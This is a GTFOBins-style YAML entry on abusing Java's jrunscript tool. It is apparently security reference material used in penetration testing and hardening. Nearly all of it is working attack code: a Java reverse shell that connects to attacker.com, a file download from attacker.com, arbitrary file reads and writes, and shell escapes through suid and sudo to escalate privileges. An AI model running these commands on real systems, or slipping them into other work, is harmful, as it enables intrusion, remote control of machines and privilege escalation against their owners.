---
description: This tool is installed starting with Java SE 6.
functions:
  shell:
    - code: jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        jrunscript -e 'var host='"'""$RHOST""'"'; var port='"$RPORT"';
        var p=new java.lang.ProcessBuilder("/bin/bash", "-i").redirectErrorStream(true).start();
        var s=new java.net.Socket(host,port);
        var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
        while(pi.available()>0)so.write(pi.read());
        while(pe.available()>0)so.write(pe.read());
        while(si.available()>0)po.write(si.read());
        so.flush();po.flush();
        java.lang.Thread.sleep(50);
        try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        jrunscript -e "cp('$URL','$LFILE')"
  file-write:
    - code: jrunscript -e 'var fw=new java.io.FileWriter("./file_to_write"); fw.write("DATA"); fw.close();'
  file-read:
    - code: jrunscript -e 'br = new BufferedReader(new java.io.FileReader("file_to_read"));
         while ((line = br.readLine()) != null) { print(line); }'
  suid:
    - description: This has been found working in macOS but failing on Linux systems.
      code: ./jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
  sudo:
    - code: sudo jrunscript -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
---
